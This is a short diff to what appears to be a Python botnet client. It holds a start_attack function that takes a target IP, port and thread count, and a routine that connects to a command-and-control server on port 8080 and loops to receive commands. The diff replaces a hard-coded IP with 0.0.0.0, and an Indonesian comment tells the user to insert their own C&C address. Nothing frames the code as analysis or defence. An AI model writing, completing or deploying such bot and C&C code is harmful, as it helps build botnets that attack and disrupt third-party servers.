@@ -31,7 +31,7 @@ def start_attack(target_ip, target_port, num_threads):
 # Koneksi ke server C&C untuk menerima perintah
 def connect_to_cc_server():
     bot_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    bot_socket.connect(("114.10.19.54", 8080))  # Ganti dengan IP server C&C Anda
+    bot_socket.connect(("0.0.0.0", 8080))  # Ganti dengan IP server C&C Anda
     
     while True:
         command = bot_socket.recv(1024).decode('utf-8')
